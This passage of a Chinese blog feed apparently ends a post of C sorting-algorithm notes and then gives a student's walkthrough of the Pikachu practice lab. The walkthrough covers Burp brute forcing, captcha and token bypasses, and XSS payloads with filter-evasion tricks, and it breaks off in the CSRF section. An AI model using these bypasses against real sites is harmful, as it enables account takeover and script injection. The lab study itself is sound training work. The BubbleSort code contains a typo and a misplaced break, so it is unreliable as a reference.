class="comment">//找到待插入位置为 j+1</span></span><br><span class="line">        <span class="comment">//如果待插入位置正好就是要插入元素所在位置则可以不进行数据赋值</span></span><br><span class="line">        <span class="keyword">if</span>((j+<span class="number">1</span>) != i)</span><br><span class="line">            sortArr-&gt;recordArr[j+<span class="number">1</span>] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>算法是<code>稳定</code>的</li><li>适用于<code>n较小</code>的序列</li></ul><h3 id="二分插入排序"><a href="#二分插入排序" class="headerlink" title="二分插入排序"></a>二分插入排序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">BinSort</span><span class="params">(SortArr* sortArr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="type">int</span> low,mid,high;</span><br><span class="line">    RecordType temp;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">1</span>;i&lt;sortArr-&gt;count;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = sortArr-&gt;recordArr[i];</span><br><span class="line">        low = <span class="number">0</span>;</span><br><span class="line">        high = i - <span class="number">1</span>;<span class="comment">//区分左右边界</span></span><br><span class="line">        <span class="keyword">while</span>(low &lt;=high)</span><br><span class="line">        &#123;</span><br><span class="line">            mid = (low + high)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(temp.key &lt;sortArr-&gt;recordArr[mid].key)</span><br><span class="line">                high = mid - <span class="number">1</span>;<span class="comment">//待排序的值比中间位置的值小，在前半区查找</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果待插入数据正好在还要插入的位置上就不用插入</span></span><br><span class="line">        <span class="keyword">if</span>(low != i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//如果需要挪动数据，空出位置，插入数据</span></span><br><span class="line">            <span class="comment">//找到插入位置后，移动数据，空出位置</span></span><br><span class="line">            <span class="keyword">for</span>(j = i - <span class="number">1</span>;j&gt;=low;j--)</span><br><span class="line">                sortArr-&gt;recordArr[j+<span class="number">1</span>] = sortArr-&gt;recordArr[j];</span><br><span class="line">            sortArr-&gt;recordArr[low] = temp;<span class="comment">//插入数据</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>算法是<code>稳定</code>的</li><li><code>链表无法折半</code></li></ul><h3 id="表插入排序"><a href="#表插入排序" class="headerlink" title="表插入排序"></a>表插入排序</h3><blockquote><p>以后有空补</p></blockquote><h3 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ShellSort</span><span class="params">(SortArr* sortArr,<span class="type">int</span> d)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j,increment;<span class="comment">//increment记录当前躺的增量</span></span><br><span class="line">    RecordType temp;<span class="comment">//保存待排序记录</span></span><br><span class="line">    <span class="keyword">for</span>(increment = d;increment&gt;<span class="number">0</span>;increment /= <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i = increment;i&lt;sortArr-&gt;count;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = sortArr-&gt;recordArr[i];<span class="comment">//保存待排序记录</span></span><br><span class="line">            j = i - increment;<span class="comment">//j按照增量进行变化</span></span><br><span class="line">            <span class="keyword">while</span>(j&gt;=<span class="number">0</span> &amp;&amp; temp.key&lt;sortArr-&gt;recordArr[j].key)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//记录按照增量间隔向后移动</span></span><br><span class="line">                sortArr-&gt;recordArr[j+increment] = sortArr-&gt;recordArr[j];</span><br><span class="line">                j -= increment;<span class="comment">//j按照增量进行变化</span></span><br><span class="line">            &#125;</span><br><span class="line">            sortArr-&gt;recordArr[j+increment] = temp;<span class="comment">//插入待排序记录</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>算法是不稳定的</li></ul><h2 id="选择类排序"><a href="#选择类排序" class="headerlink" title="选择类排序"></a>选择类排序</h2><h3 id="直接选择排序"><a href="#直接选择排序" class="headerlink" title="直接选择排序"></a>直接选择排序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">SelectSort</span><span class="params">(SortArr* sortArr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="type">int</span> minPos;<span class="comment">//记录最小元素的下标</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;sortArr-&gt;count<span class="number">-1</span>;i++)<span class="comment">//n-1躺的选择排序</span></span><br><span class="line">    &#123;</span><br><span class="line">        minPos = i;<span class="comment">//记录最小的值所在的数组下标</span></span><br><span class="line">        <span class="keyword">for</span>(j = i+<span class="number">1</span>;j&lt;sortArr-&gt;count;j++)<span class="comment">//在无序区域中寻找</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(sortArr-&gt;recordArr[j].key &lt; sortArr-&gt;recordArr[minPos].key)</span><br><span class="line">                minPos = j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(minPos != i)<span class="comment">//说明需要交换</span></span><br><span class="line">            Swap(sortArr,minPos,i);<span class="comment">//调用交换函数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>算法是<code>不稳定</code>的</li></ul><h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><ul><li>根结点大于其左右孩子——<code>大根堆</code></li><li>根结点小于其左右孩子——<code>小根堆</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>后面再补</p></blockquote><h2 id="交换类排序"><a href="#交换类排序" class="headerlink" title="交换类排序"></a>交换类排序</h2><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//此算法为冒小泡，每次把最小的移动到最左边</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">BubbleSort</span><span class="params">(SortArr *sortArr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="type">int</span> hasSwap = <span class="number">0</span>;<span class="comment">//标志，用于检测内循环是否还有数据交换</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">1</span>;i&lt;sortArr-&gt;count;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        hasSwap = <span class="number">0</span>;<span class="comment">//每趟开始重新设置交换标志为 0 </span></span><br><span class="line">        <span class="comment">//j是从后往前循环，数组的下标是 0 到 count - 1</span></span><br><span class="line">        <span class="keyword">for</span>(j = sortArr-&gt;count - <span class="number">1</span>;j&gt;=i;j--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//若前者大于后者</span></span><br><span class="line">            <span class="keyword">if</span>(sortArr-&gt;recordArr[j<span class="number">-1</span>].key&gt;sortArr-&gt;recordArr[j].key)</span><br><span class="line">            &#123;</span><br><span class="line">                Swap(sortArr,j,j<span class="number">-1</span>);</span><br><span class="line">                hsaSwap = <span class="number">1</span>;<span class="comment">//有交换则设置为 1</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!hasSwap)<span class="comment">//本躺没有发生交换</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>算法是<code>稳定</code>的</li></ul><h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218184027.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218185500.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">quickSort</span><span class="params">(SortObject *pvector,<span class="type">int</span> l,<span class="type">int</span> r)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    RecordNode temp;</span><br><span class="line">    <span class="keyword">if</span>(l&gt;=r)<span class="comment">//只有一个记录或无记录，不用排序</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    i = l;</span><br><span class="line">    j = r;</span><br><span class="line">    temp = pvector-&gt;record[i];<span class="comment">//把枢轴放到temp里面</span></span><br><span class="line">    <span class="keyword">while</span>(i!=j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>((pvector-&gt;record[j].key &gt;= temp.key) &amp;&amp; (j&gt;i))</span><br><span class="line">            j--;<span class="comment">//从右向左扫描，直到查找到第一个小于temp.key的记录</span></span><br><span class="line">        <span class="keyword">if</span>(i&lt;j)</span><br><span class="line">            pvector-&gt;record[i++] = pvector-&gt;record[j];</span><br><span class="line">        <span class="keyword">while</span>((pvector-&gt;record[i].key &lt;= temp.key) &amp;&amp; (j&gt;i))</span><br><span class="line">            i++;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;j)</span><br><span class="line">            pvector-&gt;record[j--] = pvector-&gt;record[i];</span><br><span class="line">    &#125;</span><br><span class="line">    pvector-&gt;record[i] = temp;</span><br><span class="line">    quickSort(pvector,l,i<span class="number">-1</span>);</span><br><span class="line">    quickSort(pvector,i+<span class="number">1</span>,r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>算法是<code>不稳定</code>的</li></ul><h2 id="分配类排序"><a href="#分配类排序" class="headerlink" title="分配类排序"></a>分配类排序</h2><h3 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h3><blockquote><p>以后有空补</p></blockquote><h2 id="归并类排序"><a href="#归并类排序" class="headerlink" title="归并类排序"></a>归并类排序</h2><h3 id="两路归并"><a href="#两路归并" class="headerlink" title="两路归并"></a>两路归并</h3><blockquote><p>以后有空补</p></blockquote><h3 id="多路归并"><a href="#多路归并" class="headerlink" title="多路归并"></a>多路归并</h3><blockquote><p>以后有空补</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu靶场通关</title>
      <link href="/posts/25736/"/>
      <url>/posts/25736/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面<br>最近要转专业面试了，老师说可能会问些关于安全方面的问题，比如常见漏洞的原理、利用和解决方案，刚好协会的 hxd 给我推荐了 Pikachu 这个靶场，进去看了是非常适合我的，漏洞类型比较全，分块练习，而且每个漏洞都有介绍成因和一些简单的解决方案，非常满意<br>为了方便复习，把每个模块的概述都搞进博客里 :)</p></blockquote><h1 id="搭建靶场"><a href="#搭建靶场" class="headerlink" title="搭建靶场"></a>搭建靶场</h1><ol><li>去官网把靶场下下来。<a href="https://github.com/zhuifengshaonianhanlu/pikachu">官网链接</a></li><li>把<code>pikachu</code>文件夹放到<code>phpstudy</code>的<code>web服务器根目录</code>下</li><li>进入<code>pikachu/inc/config.inc.php</code>更改数据库连接的账号密码</li><li>访问<code>localhost/pikachu-master/index.php</code>，进行初始化安装</li><li>开锤</li></ol><h1 id="Burt-Force-暴力破解漏洞"><a href="#Burt-Force-暴力破解漏洞" class="headerlink" title="Burt Force(暴力破解漏洞)"></a>Burt Force(暴力破解漏洞)</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。<br>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。这里的认证安全策略, 包括：</p><ol><li>是否要求用户设置复杂的密码；</li><li>是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；</li><li>是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；</li><li>是否采用了双因素认证；</li><li>等等。<br>千万不要小看暴力破解漏洞,往往这种简单粗暴的攻击方式带来的效果是超出预期的!<br>从来没有哪个时代的黑客像今天一样热衷于猜解密码  —奥斯特洛夫斯基</li></ol><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p>就很简单的登陆界面，也没有验证码，直接丢burp爆破</p><p><img src="https://s1.ax1x.com/2020/09/19/w5nm4S.png"></p><p><img src="https://s1.ax1x.com/2020/09/19/w5nMcj.png"></p><blockquote><p>右边的提示给了三组账号密码其实都是对的，但是还是老老实实打开<code>burp suite</code>爆破了一遍，熟悉一下</p></blockquote><h2 id="验证码绕过（on-server）"><a href="#验证码绕过（on-server）" class="headerlink" title="验证码绕过（on server）"></a>验证码绕过（on server）</h2><p>出现一个验证码，老样子先抓包丢<code>Repeater</code>里面Go一下，发现账号密码输错的情况下，验证码不会更新，验证码只会在用户输错验证码的时候更新，那就老样子直接爆破</p><h2 id="验证码绕过（on-client）"><a href="#验证码绕过（on-client）" class="headerlink" title="验证码绕过（on client）"></a>验证码绕过（on client）</h2><p>随便输一下发现会有弹窗警告，提示里面写着看前端JS的源码，F12检查元素以后发现验证码部分代码可以删掉，删掉以后就可以爆破了</p><p><img src="https://s1.ax1x.com/2020/09/19/w5n1un.png"></p><p><img src="https://s1.ax1x.com/2020/09/19/w5n3Bq.png"></p><p><img src="https://s1.ax1x.com/2020/09/19/w5nK3Q.png"></p><p><img src="https://s1.ax1x.com/2020/09/19/w5nu9g.png"></p><h2 id="token防爆破？"><a href="#token防爆破？" class="headerlink" title="token防爆破？"></a>token防爆破？</h2><blockquote><p>这题不会，看的wp</p></blockquote><p>抓包发现有 token，<code>Repeater</code>后发现返回包里有 token 的新值，即下一次登陆的 token 值在上一次登陆的返回包里，所以爆破只能单线程，<code>send intruder</code>，设置线程为1，Grep Extract处添加，选择返回包里的 token 值复制然后确认，重定向选择<code>总是</code>，有效载荷中选递归搜索，填入刚刚复制的新 token 值，加载字典开始爆破</p><p><img src="https://s1.ax1x.com/2020/09/19/w5nQjs.png"></p><h1 id="XSS-跨站脚本漏洞"><a href="#XSS-跨站脚本漏洞" class="headerlink" title="XSS(跨站脚本漏洞)"></a>XSS(跨站脚本漏洞)</h1><h2 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h2><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：</p><ol><li>反射性XSS;</li><li>存储型XSS;</li><li>DOM型XSS;</li></ol><p>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。<br>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。<br>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。<br>因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:<br>输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;<br>输出转义：根据输出点的位置对输出到前端的内容进行适当转义;<br>你可以通过“Cross-Site Scripting”对应的测试栏目，来进一步的了解该漏洞。</p><h2 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h2><p>常规输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>看看效果，发现输入的地方限制了输入的字符数量，点击提交后发现 xss 语句直接被拼接到了 url 语句里面，直接在 url 里面补全 xss 语句，达到目的</p><p><img src="https://s1.ax1x.com/2020/09/19/w5c8SO.png"></p><p><img src="https://s1.ax1x.com/2020/09/19/w5c1fK.png"></p><p>攻击成功</p><h2 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h2><p>payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>就能成功</p><h2 id="储存型xss"><a href="#储存型xss" class="headerlink" title="储存型xss"></a>储存型xss</h2><p>留言框，直接上xss代码就能弹出来</p><blockquote><p>百度了一下原理，因为存储型xss是保存在数据库里的，如果用户刷新，留言列表会从数据库提取出xss数据弹框，存的好会一直弹出来，越弹越多</p></blockquote><h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><blockquote><p>这题不会，看的wp，html、JS和DOM的知识有点欠缺，留个大坑之后要补一下</p></blockquote><p>构造普通的 xss 语句提交上去出现 what do you see？一个链接，F12检查元素发现链接正是我们输入的 xss 语句</p><p>闭合掉前面的引号即可，payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&quot;alert(/xss/)&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/19/w5cJ6e.png"></p><p>攻击成功</p><h2 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h2><blockquote><p>这题同上，也是看了wp，后面还要认真学</p></blockquote><p>payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">’ onclick=&quot;alert(/xss/)&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/19/w5cGlD.png"></p><p>攻击成功</p><h2 id="xss之盲打"><a href="#xss之盲打" class="headerlink" title="xss之盲打"></a>xss之盲打</h2><p>盲打就是在能插 xss 语句的地方都插上，乱打，但是提交上去没有弹窗的回显，点了提示后知道了后台的密码，所以 xss 语句上传到后台去了</p><p><img src="https://s1.ax1x.com/2020/09/19/w5caTI.png"></p><h2 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h2><p>传普通的 xss 语句后</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发现有一句话，<code>别说这些&#39;&gt;&#39;的话,不要怕,就是干!</code>，所以应该是过滤掉了<code>&lt;&gt;</code>内的内容，百度 xss 绕过姿势以后构造payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ScriPT</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">ScriPT</span>&gt;</span><span class="comment">&lt;!--可能后台只匹配小写的script--&gt;</span></span><br><span class="line">&lt;scri<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">pt&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)&lt;/scr</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>pt&gt;<span class="comment">&lt;!--后台可能把&lt;script&gt;过滤掉，可能只去掉一次--&gt;</span></span><br><span class="line">&lt;scri<span class="comment">&lt;!--test--&gt;</span>pt&gt;alert(111)&lt;/sc<span class="comment">&lt;!--test--&gt;</span>ript&gt;<span class="comment">&lt;!--加上注释后可能可以绕过后台过滤机制--&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>这题只有大小写匹配能过</p></blockquote><h2 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h2><p>首先百度 htmlspecialchars 是什么东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">htmlspecialchars()是PHP里面把预定义的字符转换为HTML实体的函数</span><br><span class="line">预定义的字符是</span><br><span class="line">&amp; 成为 &amp;amp</span><br><span class="line">&quot; 成为 &amp;quot</span><br><span class="line">&#x27; 成为 &amp;#039</span><br><span class="line">&lt; 成为 &amp;lt</span><br><span class="line">&gt; 成为 &amp;gt</span><br><span class="line">可用引号类型</span><br><span class="line">ENT_COMPAT：默认，仅编码双引号</span><br><span class="line">ENT_QUOTES：编码双引号和单引号</span><br><span class="line">ENT_NOQUOTES：不编码任何引号</span><br></pre></td></tr></table></figure><blockquote><p>输入<code>&#39;&quot;&lt;&gt;</code>后得到的结果是<code>\&#39;\&quot;&lt;&gt;</code>，在每个单引号和双引号前面加了<code>\</code>，不懂怎么做，以后回来填坑</p></blockquote><p><img src="https://s1.ax1x.com/2020/09/19/w5cNmd.png"></p><h2 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h2><p>这里把<code>&#39;</code> <code>&quot;</code> <code>&lt;</code> <code> &gt;</code>四个全部过滤掉了，不会做，百度说用<code>javascript:</code>伪协议绕过</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(/xss/)</span><br></pre></td></tr></table></figure><p>防御措施：</p><ol><li>输入的时候只允许 http 或 https 开头的协议，才允许输出</li><li>其次再进行 htmlspecialchars 处理</li></ol><p><img src="https://s1.ax1x.com/2020/09/19/w5cQFx.png"></p><p>攻击成功</p><h2 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h2><p>标题想到看 js 的源码，源码意思就是 get 传参给 $ms，本来以为是 else 条件的 alert 能够构造 xss 语句，但是这行被注释掉了，后来百度知道是直接在参数赋值那里注入</p><p>payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&#x27;</span><br></pre></td></tr></table></figure><p>&#96;<img src="https://s1.ax1x.com/2020/09/19/w5cYOH.png"></p><p><img src="https://s1.ax1x.com/2020/09/19/w5cU0A.png"></p><p>攻击成功</p><h1 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF(跨站请求伪造)"></a>CSRF(跨站请求伪造)</h1><h2 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h2><p>Cross-site request forgery  简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。<br>这里列举一个场景解释一下，希望能够帮助你理解。<br><strong>场景需求：</strong><br>小黑想要修改大白在购物网站tianxie<a href="http://www.xx.com上填写的会员地址./">www.xx.com上填写的会员地址。</a><br><strong>先看下大白是如何修改自己的密码的：</strong><br>登录—修改会员信息，提交请求—修改成功。<br>所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。<br>但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？<br>于是他自己跑到<a href="http://www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change">www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change</a><br>于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。<br><strong>为啥小黑的操作能够实现呢。有如下几个关键点：</strong></p><ol><li><a href="http://www.xxx.com这个网站在用户修改个人的信息时没有过多的校验,导致这个请求容易被伪造/">www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造</a>;<br>—因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。</li><li>小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;<br>—如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。<br>—因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。<br>当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做：欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。<br> —所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：<br>–对敏感信息的操作增加安全的token；<br>–对敏感信息的操作增加安全的验证码；<br>–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</li></ol><h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" 